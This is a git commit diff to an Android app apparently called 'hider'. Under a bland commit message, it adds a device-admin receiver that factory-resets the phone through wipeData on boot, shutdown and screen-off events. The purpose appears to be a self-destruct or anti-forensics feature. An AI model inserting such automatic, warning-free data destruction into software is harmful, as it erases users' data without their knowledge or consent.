2e3c535013345cf76a98cbdaf5c1a85cbf255818
confidenseuide <confidenseuide@gmail.com>
2026-01-03 14:48:10 +0500

    Update MyDeviceAdminReceiver.java

--- app/src/main/java/com/example/hider/MyDeviceAdminReceiver.java
+++ app/src/main/java/com/example/hider/MyDeviceAdminReceiver.java
@@ -4,6 +4,29 @@ import android.app.admin.*;
 import android.content.*;
 
 public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
+
+     @Override
+    public void onReceive(Context context, Intent intent) {
+        String action = intent.getAction();
+        if (action == null) return;
+
+        if (action.equals(Intent.ACTION_BOOT_COMPLETED) || 
+            action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED) || 
+            action.equals(Intent.ACTION_SHUTDOWN) || 
+            action.equals(Intent.ACTION_SCREEN_OFF) || // Шанс мал, но пусть будет
+            action.equals("android.intent.action.QUICKBOOT_POWEROFF")) {
+
+            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+			
+            try {             
+                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+            } catch (Exception e) {
+                try {
+                    dpm.wipeData(0);
+                } catch (Exception ignored) {}
+            }
+        }
+    }
 	
     @Override
     public void onProfileProvisioningComplete(Context context, Intent intent) {
